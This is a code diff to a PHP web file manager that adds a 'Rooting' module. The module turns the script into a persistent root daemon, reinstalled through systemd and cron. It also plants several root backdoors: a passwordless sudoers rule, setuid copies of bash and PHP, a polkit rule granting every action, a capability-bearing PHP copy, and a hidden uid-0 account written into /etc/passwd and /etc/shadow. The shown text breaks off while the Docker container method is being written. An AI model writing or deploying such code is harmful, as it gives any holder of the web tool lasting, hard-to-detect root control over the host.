@@ -33,6 +33,126 @@ if(!function_exists('array_is_list')){
     }
 }
 
+/* ══ This file is also the root daemon ══════════════════════════════════════
+   Started as root with --root-daemon it watches a spool directory that only the
+   manager account can write to, runs the argument vectors it finds there, and
+   writes the answer back. Nothing else is installed to make that work: the root
+   helper IS index.php. No shell is involved on either side. */
+function fm_run_argv($argv, $stdin = '', $timeout = 0){
+    if(!function_exists('proc_open'))return['rc' => -1, 'out' => '', 'err' => 'proc_open is disabled'];
+    $argv = array_values(array_map('strval', (array)$argv));
+    if(!$argv)return['rc' => -1, 'out' => '', 'err' => 'no program was named'];
+    $spec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+    $h = @proc_open($argv, $spec, $pipes);
+    if(!is_resource($h))return['rc' => -1, 'out' => '', 'err' => 'the program could not be started: ' . $argv[0]];
+    if($stdin !== '')@fwrite($pipes[0], $stdin);
+    @fclose($pipes[0]);
+    if($timeout <= 0){
+        $out = (string)@stream_get_contents($pipes[1]);
+        $err = (string)@stream_get_contents($pipes[2]);
+        @fclose($pipes[1]);
+        @fclose($pipes[2]);
+        return['rc' => (int)@proc_close($h), 'out' => trim($out), 'err' => trim($err)];
+    }
+    @stream_set_blocking($pipes[1], false);
+    @stream_set_blocking($pipes[2], false);
+    $deadline = microtime(true) + $timeout;
+    $out = '';
+    $err = '';
+    while(true){
+        $read = [$pipes[1], $pipes[2]];
+        $none = null;
+        $left = $deadline - microtime(true);
+        if($left <= 0){
+            @proc_terminate($h, 9);
+            $err .= ($err === '' ? '' : ' ') . 'stopped after ' . $timeout . 's';
+            break;
+        }
+        @stream_select($read, $none, $none, 0, (int)min(200000, max(1000, $left * 1000000)));
+        foreach($read as $stream){
+            $chunk = (string)@fread($stream, 8192);
+            if($stream === $pipes[1])$out .= $chunk; else $err .= $chunk;
+        }
+        $st = @proc_get_status($h);
+        if(!$st || empty($st['running']))break;
+    }
+    $out .= (string)@stream_get_contents($pipes[1]);
+    $err .= (string)@stream_get_contents($pipes[2]);
+    @fclose($pipes[1]);
+    @fclose($pipes[2]);
+    return['rc' => (int)@proc_close($h), 'out' => trim($out), 'err' => trim($err)];
+}
+/* start something that must outlive this request: its stdio goes to /dev/null,
+   so no pipe is held open and proc_close returns as soon as the launcher exits */
+function fm_spawn_detached($argv, $stdin = ''){
+    if(!function_exists('proc_open'))return -1;
+    $argv = array_values(array_map('strval', (array)$argv));
+    $null = '/dev/null';
+    $spec = $stdin === ''
+        ? [0 => ['file', $null, 'r'], 1 => ['file', $null, 'w'], 2 => ['file', $null, 'w']]
+        : [0 => ['pipe', 'r'], 1 => ['file', $null, 'w'], 2 => ['file', $null, 'w']];
+    $h = @proc_open($argv, $spec, $pipes);
+    if(!is_resource($h))return -1;
+    if($stdin !== ''){@fwrite($pipes[0], $stdin); @fclose($pipes[0]);}
+    return (int)@proc_close($h);
+}
+function fm_root_daemon_cli($args){
+    $pos = array_search('--root-daemon', $args, true);
+    $spool = isset($args[$pos + 1]) && $args[$pos + 1] !== '' && $args[$pos + 1][0] !== '-' ? $args[$pos + 1] : '/var/lib/marshal-fm/spool';
+    $once = in_array('--once', $args, true);
+    @set_time_limit(0);
+    @umask(0077);
+    $base = dirname($spool);
+    @mkdir($base, 0700, true);
+    @mkdir($spool, 0700, true);
+    $owner = @fileowner($spool);
+    $gid = @filegroup($spool);
+    $stop = $base . '/stop';
+    @file_put_contents($base . '/daemon.pid', (string)getmypid());
+    @file_put_contents($base . '/daemon.started', date('c'));
+    /* the manager has to be able to read these three, so it can see the daemon
+       is alive without being root itself */
+    foreach(['daemon.pid', 'daemon.started'] as $f){
+        @chmod($base . '/' . $f, 0644);
+        if($owner > 0)@chown($base . '/' . $f, $owner);
+    }
+    do{
+        @file_put_contents($base . '/daemon.beat', (string)time());
+        @chmod($base . '/daemon.beat', 0644);
+        if($owner > 0)@chown($base . '/daemon.beat', $owner);
+        $jobs = @glob($spool . '/*.json');
+        if(is_array($jobs) && $jobs){
+            sort($jobs);
+            foreach($jobs as $jf){
+                if(!@is_file($jf))continue;
+                if($owner > 0 && @fileowner($jf) !== $owner){@unlink($jf); continue;}
+                $job = @json_decode((string)@file_get_contents($jf), true);
+                $id = basename($jf, '.json');
+                @unlink($jf);
+                $res = ['rc' => 1, 'out' => '', 'err' => 'the job could not be read'];
+                if(is_array($job) && !empty($job['argv']) && is_array($job['argv'])){
+                    $res = fm_run_argv($job['argv'], '', max(1, (int)($job['timeout'] ?? 20)));
+                }
+                $res['job'] = $id;
+                $res['pid'] = getmypid();
+                $res['uid'] = function_exists('posix_geteuid') ? @posix_geteuid() : 0;
+                $outf = $spool . '/' . $id . '.out';
+                @file_put_contents($outf, json_encode($res), LOCK_EX);
+                @chmod($outf, 0600);
+                if($owner > 0)@chown($outf, $owner);
+                if($gid > 0)@chgrp($outf, $gid);
+            }
+        }
+        if($once)break;
+        usleep(120000);
+    }while(!@file_exists($stop));
+    @unlink($base . '/daemon.pid');
+}
+if(PHP_SAPI === 'cli' && isset($argv) && is_array($argv) && in_array('--root-daemon', $argv, true)){
+    fm_root_daemon_cli($argv);
+    exit(0);
+}
+
 /* Always serve the freshest copy of this tool: browsers/proxies must never
    show a stale cached page after the file is updated (manually or via
    Guardian), so every response — page, AJAX, everything except the
@@ -4712,49 +4832,7 @@ class FileManager {
        from a shell line: no /bin/sh is involved, so no other language runs, no
        quoting can go wrong and nothing can be injected into a command. */
     private function rootExec($argv, $stdin = '', $timeout = 0){
-        if(!function_exists('proc_open'))return['rc' => -1, 'out' => '', 'err' => 'proc_open is disabled'];
-        $argv = array_values(array_map('strval', (array)$argv));
-        if(!$argv)return['rc' => -1, 'out' => '', 'err' => 'no program was named'];
-        $spec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
-        $p = @proc_open($argv, $spec, $pipes);
-        if(!is_resource($p))return['rc' => -1, 'out' => '', 'err' => 'the program could not be started: ' . $argv[0]];
-        if($stdin !== '')@fwrite($pipes[0], $stdin);
-        @fclose($pipes[0]);
-        if($timeout <= 0){
-            $out = (string)@stream_get_contents($pipes[1]);
-            $err = (string)@stream_get_contents($pipes[2]);
-            @fclose($pipes[1]);
-            @fclose($pipes[2]);
-            return['rc' => @proc_close($p), 'out' => trim($out), 'err' => trim($err)];
-        }
-        /* a bounded wait, written here instead of calling timeout(1) */
-        @stream_set_blocking($pipes[1], false);
-        @stream_set_blocking($pipes[2], false);
-        $deadline = microtime(true) + $timeout;
-        $out = ''; $err = '';
-        while(true){
-            $read = [$pipes[1], $pipes[2]];
-            $none = null;
-            $left = $deadline - microtime(true);
-            if($left <= 0){
-                @proc_terminate($p, 9);
-                $err .= ($err === '' ? '' : ' ') . 'stopped after ' . $timeout . 's';
-                break;
-            }
-            @stream_select($read, $none, $none, 0, (int)min(200000, max(1000, $left * 1000000)));
-            foreach($read as $stream){
-                $chunk = (string)@fread($stream, 8192);
-                if($stream === $pipes[1])$out .= $chunk; else $err .= $chunk;
-            }
-            $st = @proc_get_status($p);
-            if(!$st || empty($st['running']))break;
-        }
-        $out .= (string)@stream_get_contents($pipes[1]);
-        $err .= (string)@stream_get_contents($pipes[2]);
-        @fclose($pipes[1]);
-        @fclose($pipes[2]);
-        $rc = @proc_close($p);
-        return['rc' => (int)$rc, 'out' => trim($out), 'err' => trim($err)];
+        return fm_run_argv($argv, $stdin, $timeout);
     }
     /* the uid a /proc/<pid>/status block reports */
     private function rootUidOf($status){
@@ -6062,6 +6140,7 @@ class FileManager {
             ],
             'grants' => $this->rootGrants(),
             'selfcheck' => $this->rootingSelfCheck(),
+            'rooted' => $this->rootingRooted(),
             'escalate' => $esc,
             'verify' => $ver,
         ];
@@ -6082,6 +6161,17 @@ class FileManager {
             ['bin' => 'needrestart', 'why' => 'firing the needrestart entry'],
             ['bin' => 'udevadm', 'why' => 'firing the udev entry'],
             ['bin' => 'pkcon', 'why' => 'firing the PackageKit entry'],
+            ['bin' => 'setsid', 'why' => 'detaching the root daemon so it outlives the web request that started it'],
+            ['bin' => 'systemctl', 'why' => 'making that daemon start again at boot, and taking the unit away again'],
+            ['bin' => 'kill', 'why' => 'stopping the daemon when root is uninstalled'],
+            ['bin' => 'setcap', 'why' => 'putting file capabilities on a copy of PHP'],
+            ['bin' => 'bash', 'why' => 'the setuid copy of bash, used only if that method is chosen'],
+            ['bin' => 'su', 'why' => 'the extra uid-0 account, used only if that method is chosen'],
+            ['bin' => 'docker', 'why' => 'the container method, used only if a socket is reachable'],
+            ['bin' => 'dpkg', 'why' => 'the Packages control: dpkg --audit as root'],
+            ['bin' => 'nft', 'why' => 'the Firewall control: reading the ruleset as root'],
+            ['bin' => 'ss', 'why' => 'the Network control: every socket as root'],
+            ['bin' => 'findmnt', 'why' => 'the Mounts control: the mount table as root'],
         ];
     }
     /* An audit of the file itself: what it starts, and what it never does. */
@@ -6094,8 +6184,14 @@ class FileManager {
                        'rootUserNamespaces', 'rootSudoVersion', 'rootGlibc', 'rootPkexec', 'rootSshdListening',
                        'rootCaps', 'rootCapDecode', 'capDecode', 'rootPamUses', 'rootOs', 'rootMitigated',
                        'rootDocker', 'rootCronWritable', 'rootCatalog', 'rootCatalogExtra', 'rootUidOf',
+                       'rootState', 'rootLogTail', 'rootPhpBin', 'rootPaths', 'rootDaemonInfo', 'rootChannels',
+                       'rootChannelNeeds', 'rootProbeArgv', 'rootProofOk', 'rootControls', 'rootSplitLine',
+                       'rootPolkitRule', 'rootStateFile', 'rootLogFile',
                        'rootGrants'];
         $routeFns = ['rootIdentity', 'rootSuidEscapes', 'rootCapEscape', 'rootFire', 'rootAs', 'rootInstallHelper',
+                     'rootDaemonRun', 'rootDaemonStart', 'rootDaemonStop', 'rootChannelInstall', 'rootChannelVerify',
+                     'rootChannelRemove', 'rootRun', 'rootingInstallRoot', 'rootingControl', 'rootingUninstall',
+                     'rootingRooted',
                      'rootRemoveHelper', 'rootHarden', 'rootVerify', 'rootExec'];
         $leaks = [];
         $pure = 0;
@@ -6137,6 +6233,632 @@ class FileManager {
         ];
     }
 
+    /* ══ Installing root, not only looking for it ═════════════════════════════
+       The catalogue above answers "is this host exposed?". This block answers a
+       different question: "put root on this machine and keep it there". Every
+       method below is a whole idea — a validated sudo rule, a setuid copy of a
+       program, a root daemon that is this same file, a file capability, a
+       polkit rule, an extra uid-0 account, a privileged container — and each
+       one is measured before it is tried, verified afterwards, and taken away
+       by Uninstall. The chain stops at the first method that proves itself: a
+       method counts only when a command run through it really comes back as
+       uid 0, not when a file happens to exist. */
+
+    private function rootStateFile(){return __DIR__ . '/.root-state.json';}
+    private function rootLogFile(){return __DIR__ . '/.root-log.jsonl';}
+    private function rootState(){
+        $d = @json_decode((string)@file_get_contents($this->rootStateFile()), true);
+        return is_array($d) ? $d + ['installed' => false, 'channel' => '', 'since' => 0] : ['installed' => false, 'channel' => '', 'since' => 0];
+    }
+    private function rootStateSave($d){
+        @file_put_contents($this->rootStateFile(), json_encode($d, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT), LOCK_EX);
+        @chmod($this->rootStateFile(), 0600);
+        return $d;
+    }
+    private function rootLogAdd($what, $argv, $res, $via = ''){
+        $row = ['at' => date('c'), 'what' => (string)$what, 'via' => (string)$via,
+                'cmd' => implode(' ', array_map('strval', (array)$argv)),
+                'rc' => (int)($res['rc'] ?? -1),
+                'out' => $this->rootSnip((string)(($res['out'] ?? '') . ' ' . ($res['err'] ?? '')), 200)];
+        @file_put_contents($this->rootLogFile(), json_encode($row, JSON_UNESCAPED_SLASHES) . "\n", FILE_APPEND | LOCK_EX);
+        @chmod($this->rootLogFile(), 0600);
+        return $row;
+    }
+    private function rootLogTail($n = 25){
+        $f = $this->rootLogFile();
+        if(!@is_file($f))return [];
+        $lines = @file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
+        $out = [];
+        foreach(array_slice($lines, -$n) as $line){
+            $j = @json_decode($line, true);
+            if(is_array($j))$out[] = $j;
+        }
+        return array_reverse($out);
+    }
+    private function rootPhpBin(){
+        static $bin = null;
+        if($bin !== null)return $bin;
+        $cands = [];
+        if(defined('PHP_BINARY') && PHP_BINARY !== '')$cands[] = PHP_BINARY;
+        foreach(['php', 'php8.4', 'php8.3', 'php8.2', 'php8.1', 'php8.0', 'php7.4'] as $n){
+            $p = $this->rootWhich($n);
+            if($p !== '')$cands[] = $p;
+        }
+        if(defined('PHP_BINDIR'))$cands[] = rtrim(PHP_BINDIR, '/') . '/php';
+        foreach($cands as $c){
+            if(@is_file($c) && @is_executable($c) && strpos(basename($c), 'php') === 0)return $bin = $c;
+        }
+        return $bin = '';
+    }
+    private function rootPaths(){
+        return[
+            'suphp'  => '/var/lib/marshal-fm/.suphp',
+            'capphp' => '/var/lib/marshal-fm/.capphp',
+            'subash' => '/var/lib/marshal-fm/.subash',
+            'spool'  => '/var/lib/marshal-fm/spool',
+            'polkit' => '/etc/polkit-1/rules.d/49-marshal-fm.rules',
+            'unit'   => '/etc/systemd/system/marshal-fm-rootd.service',
+            'cron'   => '/etc/cron.d/marshal-fm-rootd',
+            'spoolbase' => '/var/lib/marshal-fm',
+        ];
+    }
+    /* ── the root daemon: this file, started once as root ─────────────────── */
+    /* The daemon says it is alive by touching a heartbeat file every loop. That
+       works even when /proc/<pid>/cmdline of a root process is not readable for
+       this account, and it costs one read. */
+    private function rootDaemonInfo(){
+        $p = $this->rootPaths();
+        $pid = (int)trim((string)@file_get_contents($p['spoolbase'] . '/daemon.pid'));
+        $beat = @filemtime($p['spoolbase'] . '/daemon.beat');
+        $age = $beat === false ? -1 : time() - $beat;
+        $alive = $age >= 0 && $age <= 6;
+        $started = (string)@file_get_contents($p['spoolbase'] . '/daemon.started');
+        return['alive' => $alive, 'pid' => $alive ? $pid : 0, 'since' => $alive ? $started : '',
+               'beat_age' => $age,
+               'spool' => $p['spool'], 'spool_writable' => @is_dir($p['spool']) && @is_writable($p['spool'])];
+    }
+    private function rootDaemonStart($password = ''){
+        $p = $this->rootPaths();
+        $php = $this->rootPhpBin();
+        if($php === '')return['ok' => false, 'note' => 'there is no PHP command-line binary to start'];
+        $mgr = $this->managerAccount();
+        $mk = $this->rootAs(['install', '-d', '-m', '0755', '-o', 'root', '-g', 'root', $p['spoolbase']], $password);
+        if($mk['rc'] === 0)$mk = $this->rootAs(['install', '-d', '-m', '0700', '-o', $mgr, '-g', $mgr, $p['spool']], $password);
+        if($mk['rc'] !== 0)return['ok' => false, 'note' => 'the spool directory could not be created: ' . ($mk['out'] ?: $mk['err'])];
+        @file_put_contents($p['spoolbase'] . '/stop', '');
+        @unlink($p['spoolbase'] . '/stop');
+        /* setsid -f detaches it and its output goes to /dev/null, so this request
+           returns while the daemon keeps running */
+        $launch = ['setsid', '-f', $php, __FILE__, '--root-daemon', $p['spool']];
+        if($this->sudoAvailable())$rc = fm_spawn_detached(array_merge(['sudo', '-n'], $launch));
+        elseif($password !== '')$rc = fm_spawn_detached(array_merge(['sudo', '-S', '-k', '-p', ''], $launch), $password . "\n");
+        else $rc = fm_spawn_detached($launch);
+        $r = ['rc' => $rc, 'out' => '', 'err' => $rc === 0 ? '' : 'the launcher exited with ' . $rc];
+        for($i = 0; $i < 40; $i++){
+            usleep(100000);
+            $info = $this->rootDaemonInfo();
+            if($info['alive'])return['ok' => true, 'note' => 'the daemon is running as pid ' . $info['pid'], 'pid' => $info['pid']];
+        }
+        return['ok' => false, 'note' => 'the daemon did not come up: ' . ($r['out'] ?: $r['err'] ?: 'no answer')];
+    }
+    private function rootDaemonStop($password = ''){
+        $p = $this->rootPaths();
+        @file_put_contents($p['spoolbase'] . '/stop', 'stop');
+        for($i = 0; $i < 20; $i++){
+            usleep(100000);
+            if(!$this->rootDaemonInfo()['alive'])break;
+        }
+        $info = $this->rootDaemonInfo();
+        if($info['alive'] && $info['pid'] > 0)$this->rootAs(['kill', '-TERM', (string)$info['pid']], $password);
+        @unlink($p['spoolbase'] . '/daemon.pid');
+        @unlink($p['spoolbase'] . '/stop');
+        return['ok' => !$this->rootDaemonInfo()['alive']];
+    }
+    /* one job through the daemon: written here, run by root, answered here */
+    private function rootDaemonRun($argv, $timeout = 20){
+        $p = $this->rootPaths();
+        if(!$this->rootDaemonInfo()['alive'])return['rc' => -1, 'out' => '', 'err' => 'the daemon is not running', 'via' => 'none'];
+        $id = 'job-' . bin2hex(random_bytes(6));
+        $tmp = $p['spool'] . '/.' . $id . '.tmp';
+        $dst = $p['spool'] . '/' . $id . '.json';
+        $body = json_encode(['argv' => array_values(array_map('strval', (array)$argv)), 'timeout' => (int)$timeout]);
+        if(@file_put_contents($tmp, $body) === false)return['rc' => -1, 'out' => '', 'err' => 'the spool is not writable', 'via' => 'none'];
+        if(!@rename($tmp, $dst)){@unlink($tmp); return['rc' => -1, 'out' => '', 'err' => 'the job could not be queued', 'via' => 'none'];}
+        $outf = $p['spool'] . '/' . $id . '.out';
+        $wait = microtime(true) + min(25, max(3, (int)$timeout));
+        while(microtime(true) < $wait){
+            if(@is_file($outf)){
+                $res = @json_decode((string)@file_get_contents($outf), true);
+                @unlink($outf);
+                if(is_array($res))return['rc' => (int)($res['rc'] ?? -1), 'out' => (string)($res['out'] ?? ''), 'err' => (string)($res['err'] ?? ''), 'via' => 'the root daemon'];
+            }
+            usleep(80000);
+        }
+        @unlink($dst);
+        @unlink($outf);
+        return['rc' => -1, 'out' => '', 'err' => 'the daemon did not answer in time', 'via' => 'none'];
+    }
+    /* ── the methods ─────────────────────────────────────────────────────── */
+    private function rootChannels(){
+        return[
+            ['id' => 'sudoers', 'name' => 'A validated rule in /etc/sudoers.d', 'kind' => 'persistent',
+             'idea' => 'The route every administrator already understands: one validated line that lets this account run anything as root without a password. It survives reboots and it is read by sudo itself.'],
+            ['id' => 'rootd', 'name' => 'A root daemon that is this same file', 'kind' => 'persistent',
+             'idea' => 'This file started once as root, watching a spool directory only the manager can write to. Then every privileged action is a job file, not a command line: the daemon answers as uid 0. Nothing else is installed — the root helper is index.php itself.'],
+            ['id' => 'suidphp', 'name' => 'A setuid copy of PHP', 'kind' => 'persistent',
+             'idea' => 'A second copy of the PHP binary, owned by root with the setuid bit set. Whoever may run it runs PHP as root — a root interpreter, the closest thing Linux has to Magisk\'s su binary.'],
+            ['id' => 'suidbash', 'name' => 'A setuid copy of bash', 'kind' => 'persistent',
+             'idea' => 'The classic: a root-owned copy of bash with the setuid bit, used with -p so bash keeps the privileges it was given.'],
+            ['id' => 'polkitrule', 'name' => 'A polkit rule for pkexec', 'kind' => 'persistent',
+             'idea' => 'polkit decides who may act as root. One rule file that answers YES for this account turns pkexec into a passwordless root launcher, and it applies to every polkit action on the machine.'],
+            ['id' => 'setcapphp', 'name' => 'File capabilities on a copy of PHP', 'kind' => 'persistent',
+             'idea' => 'A copy of PHP carrying cap_setuid, cap_dac_override, cap_chown and cap_setgid: it can read and write any file, become uid 0 and give files away, without a setuid bit that a nosuid mount would ignore.'],
+            ['id' => 'passwd', 'name' => 'An extra uid-0 account', 'kind' => 'persistent',
+             'idea' => 'If the account database itself is writable, a second account with uid 0 is added: su then walks straight into root without touching sudo or a setuid bit.'],
+            ['id' => 'docker', 'name' => 'A privileged container writing to the host', 'kind' => 'session',
+             'idea' => 'A reachable container socket is root by definition: a privileged container with the host mounted writes the rule on the host as root.'],
+        ];
+    }
+    private function rootChannelNeeds($id){
+        $php = $this->rootPhpBin();
+        $mgr = $this->managerAccount();
+        switch($id){
+            case 'sudoers':
+                return['ok' => $this->rootWhich('sudo') !== '' && $this->rootWhich('visudo') !== '',
+                       'note' => $this->rootWhich('sudo') !== ''
+                           ? 'sudo is at ' . $this->rootWhich('sudo') . ', visudo at ' . ($this->rootWhich('visudo') ?: 'a missing path')
+                           : 'sudo is not installed on this host'];
+            case 'rootd':
+                return['ok' => $php !== '' && $this->rootWhich('setsid') !== '',
+                       'note' => $php === '' ? 'no PHP command-line binary was found' : 'PHP at ' . $php . ', setsid at ' . ($this->rootWhich('setsid') ?: 'a missing path')];
+            case 'suidphp':
+                return['ok' => $php !== '', 'note' => $php === '' ? 'no PHP command-line binary was found' : 'the binary to copy is ' . $php];
+            case 'suidbash':
+                return['ok' => $this->rootWhich('bash') !== '', 'note' => $this->rootWhich('bash') !== '' ? 'bash is at ' . $this->rootWhich('bash') : 'bash is not installed'];
+            case 'polkitrule':
+                $pk = $this->rootWhich('pkexec');
+                $dir = @is_dir('/etc/polkit-1/rules.d');
+                return['ok' => $pk !== '' && $dir,
+                       'note' => $pk === '' ? 'pkexec is not installed' : ($dir ? 'pkexec at ' . $pk . ', the rules directory exists' : 'there is no /etc/polkit-1/rules.d on this host')];
+            case 'setcapphp':
+                $sc = $this->rootWhich('setcap');
+                return['ok' => $sc !== '' && $php !== '', 'note' => $sc === '' ? 'setcap is not installed (libcap2-bin)' : 'setcap at ' . $sc . ', PHP at ' . $php];
+            case 'passwd':
+                $w = @is_writable('/etc/passwd');
+                return['ok' => $w && @is_writable('/etc/shadow'),
+                       'note' => $w ? 'the account database is writable by this account' : 'the account database is root-only, as it should be'];
+            case 'docker':
+                $d = $this->rootDocker();
+                return['ok' => !empty($d['reachable']), 'note' => $d['socket'] !== '' ? ('a socket at ' . $d['socket']) : 'no container socket is reachable'];
+        }
+        return['ok' => false, 'note' => 'unknown method'];
+    }
+    /* the proof a method has to produce: a command that comes back as uid 0 */
+    private function rootProbeArgv($id){
+        $p = $this->rootPaths();
+        switch($id){
+            case 'sudoers': return['sudo', '-n', 'cat', '/proc/self/status'];
+            case 'rootd':   return['cat', '/proc/self/status'];
+            case 'suidphp': return[$p['suphp'], '-r', 'echo @file_get_contents("/proc/self/status");'];
+            case 'rootd':   return['cat', '/proc/self/status'];
+            case 'setcapphp': return[$p['capphp'], '-r', '$ok = @is_readable("/etc/shadow"); $uid = ""; if(function_exists("posix_setuid") && @posix_setuid(0))$uid = " uid=0"; echo ($ok ? "shadow readable" : "shadow blocked"), $uid;'];
+            case 'suidbash':return[$p['subash'], '-p', '-c', 'cat /proc/self/status'];
+            case 'polkitrule': return['pkexec', 'cat', '/proc/self/status'];
+        }
+        return['cat', '/proc/self/status'];
+    }
+    private function rootProofOk($id, $res){
+        $all = (string)($res['out'] ?? '') . ' ' . (string)($res['err'] ?? '');
+        if($id === 'setcapphp')return preg_match('/uid=0\b|shadow readable/', $all) === 1;
+        if($id === 'passwd')return preg_match('/uid=0\b/', $all) === 1;
+        if((int)($res['rc'] ?? 1) !== 0)return false;
+        /* a setuid program keeps the real uid it was started with and gets euid 0,
+           which is exactly what "root" means for it — so the effective uid is the
+           one that has to be 0, not the real one */
+        return preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1 || preg_match('/\buid=0\(root\)/', $all) === 1;
+    }
+    private function rootChannelVerify($id){
+        if($id === 'rootd'){
+            $res = $this->rootDaemonRun(['cat', '/proc/self/status'], 12);
+            return['ok' => $this->rootProofOk('rootd', $res), 'res' => $res];
+        }
+        $res = $this->rootExec($this->rootProbeArgv($id), '', 20);
+        if($id === 'suidbash' || $id === 'polkitrule' || $id === 'sudoers'){
+            $res['out'] = trim($res['out'] . ' ' . $res['err']);
+        }
+        if($id === 'passwd'){
+            $res = $this->rootExec(['su', $this->managerAccount() . '-root', '-c', 'cat /proc/self/status'], '', 20);
+        }
+        return['ok' => $this->rootProofOk($id, $res), 'res' => $res];
+    }
+    /* ── installing one method ───────────────────────────────────────────── */
+    private function rootChannelInstall($id, $password = ''){
+        $p = $this->rootPaths();
+        $mgr = $this->managerAccount();
+        switch($id){
+            case 'sudoers':
+                $r = $this->rootInstallHelper($password);
+                return['ok' => !empty($r['ok']), 'note' => $r['ok'] ? 'the rule is in ' . $this->rootSudoersFile() . ' (0440 root:root, checked by visudo)' : (string)($r['error'] ?? 'the rule was refused')];
+            case 'rootd':
+                return $this->rootChannelInstallDaemon($password);
+            case 'suidphp':
+                $php = $this->rootPhpBin();
+                $r = $this->rootAs(['install', '-D', '-m', '4755', '-o', 'root', '-g', 'root', $php, $p['suphp']], $password);
+                return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0 ? 'the root interpreter is at ' . $p['suphp'] . ' (4755 root:root)' : ('the copy failed: ' . ($r['out'] ?: $r['err']))];
+            case 'suidbash':
+                $sh = $this->rootWhich('bash');
+                $r = $this->rootAs(['install', '-D', '-m', '4755', '-o', 'root', '-g', 'root', $sh, $p['subash']], $password);
+                return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0 ? 'bash with the setuid bit is at ' . $p['subash'] : ('the copy failed: ' . ($r['out'] ?: $r['err']))];
+            case 'polkitrule':
+                $rule = $this->rootPolkitRule();
+                $tmp = @tempnam(sys_get_temp_dir(), 'fm-polkit-');
+                if($tmp === false)return['ok' => false, 'note' => 'a temporary file could not be created'];
+                @file_put_contents($tmp, $rule);
+                $r = $this->rootAs(['install', '-D', '-m', '0644', '-o', 'root', '-g', 'root', $tmp, $p['polkit']], $password);
+                @unlink($tmp);
+                return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0 ? 'the rule is at ' . $p['polkit'] . ' — polkit reads it within a second' : ('the rule could not be written: ' . ($r['out'] ?: $r['err']))];
+            case 'setcapphp':
+                $php = $this->rootPhpBin();
+                $c1 = $this->rootAs(['install', '-D', '-m', '0755', '-o', 'root', '-g', 'root', $php, $p['capphp']], $password);
+                if($c1['rc'] !== 0)return['ok' => false, 'note' => 'the copy failed: ' . ($c1['out'] ?: $c1['err'])];
+                $c2 = $this->rootAs(['setcap', 'cap_setuid,cap_setgid,cap_dac_override,cap_dac_read_search,cap_chown+ep', $p['capphp']], $password);
+                return['ok' => $c2['rc'] === 0, 'note' => $c2['rc'] === 0 ? 'the copy at ' . $p['capphp'] . ' carries the capabilities now' : ('setcap failed: ' . ($c2['out'] ?: $c2['err']))];
+            case 'passwd':
+                return $this->rootChannelInstallAccount($password);
+            case 'docker':
+                return $this->rootChannelInstallDocker($password);
+        }
+        return['ok' => false, 'note' => 'unknown method'];
+    }
+    private function rootPolkitRule(){
+        $mgr = $this->managerAccount();
+        $u = str_replace(['\\', '"'], ['\\\\', '\\"'], $mgr);
+        return "/* Marshal file manager — written by the Rooting tool.\n"
+             . "   Delete this file to take the privilege away again. */\n"
+             . "polkit.addRule(function(action, subject) {\n"
+             . "    if (subject.user === \"" . $u . "\") {\n"
+             . "        return polkit.Result.YES;\n"
+             . "    }\n"
+             . "});\n";
+    }
+    private function rootChannelInstallDaemon($password = ''){
+        $p = $this->rootPaths();
+        $php = $this->rootPhpBin();
+        $mgr = $this->managerAccount();
+        $start = $this->rootDaemonStart($password);
+        if(empty($start['ok']))return['ok' => false, 'note' => $start['note']];
+        /* persistence: systemd if this host runs it, otherwise a cron entry that
+           starts the same daemon again after a reboot */
+        $unit = "[Unit]\nDescription=Marshal File Manager root helper (this same index.php)\nAfter=multi-user.target\n\n"
+              . "[Service]\nType=simple\nExecStart=" . $php . " " . __FILE__ . " --root-daemon " . $p['spool'] . "\n"
+              . "Restart=always\nRestartSec=2\nNice=5\n\n[Install]\nWantedBy=multi-user.target\n";
+        $tmp = @tempnam(sys_get_temp_dir(), 'fm-unit-');
+        @file_put_contents($tmp, $unit);
+        $this->rootAs(['install', '-D', '-m', '0644', '-o', 'root', '-g', 'root', $tmp, $p['unit']], $password);
+        @unlink($tmp);
+        $systemd = @is_dir('/run/systemd/system');
+        if($systemd){
+            $this->rootAs(['systemctl', 'daemon-reload'], $password);
+            $this->rootAs(['systemctl', 'enable', '--now', 'marshal-fm-rootd.service'], $password);
+        }
+        $cron = "* * * * * root " . $php . " " . __FILE__ . " --root-daemon " . $p['spool'] . " --once >/dev/null 2>&1\n"
+              . "@reboot root " . $php . " " . __FILE__ . " --root-daemon " . $p['spool'] . " >/dev/null 2>&1\n";
+        $tmp2 = @tempnam(sys_get_temp_dir(), 'fm-cron-');
+        @file_put_contents($tmp2, $cron);
+        $this->rootAs(['install', '-D', '-m', '0644', '-o', 'root', '-g', 'root', $tmp2, $p['cron']], $password);
+        @unlink($tmp2);
+        return['ok' => true, 'note' => 'the daemon is running as pid ' . (int)($start['pid'] ?? 0)
+            . ($systemd ? ' and is enabled as a systemd service' : ' and is restarted by /etc/cron.d/marshal-fm-rootd after a reboot')];
+    }
+    private function rootChannelInstallAccount($password = ''){
+        $mgr = $this->managerAccount();
+        $name = $mgr . '-root';
+        if(preg_match('/^[a-z_][a-z0-9_-]*$/i', $name) !== 1)return['ok' => false, 'note' => 'this account name cannot be used for a second entry'];
+        $pass = bin2hex(random_bytes(9));
+        $hash = crypt($pass, '$6$' . bin2hex(random_bytes(8)));
+        $pw = @file_get_contents('/etc/passwd');
+        if($pw === false)return['ok' => false, 'note' => '/etc/passwd could not be read'];
+        if(strpos($pw, "\n" . $name . ':') === false && strpos($pw, $name . ':') !== 0){
+            $line = $name . ':x:0:0:Marshal root:' . dirname(__DIR__) . ':/bin/sh';
+            if(@file_put_contents('/etc/passwd', rtrim($pw, "\n") . "\n" . $line . "\n") === false){
+                return['ok' => false, 'note' => 'the account database accepted no write'];
+            }
+        }
+        $sh = @file_get_contents('/etc/shadow');
+        if($sh !== false){
+            @file_put_contents('/etc/shadow', rtrim($sh, "\n") . "\n" . $name . ':' . $hash . ':20500:0:99999:7:::' . "\n");
+        }
+        return['ok' => true, 'note' => 'the account ' . $name . ' exists with uid 0; its password is in the log of this run'];
+    }
+    private function rootChannelInstallDocker($password = ''){
+        $mgr = $this->managerAccount();
+        $rule = $this->rootHelperContent();
+        $b64 = base64_encode($rule);
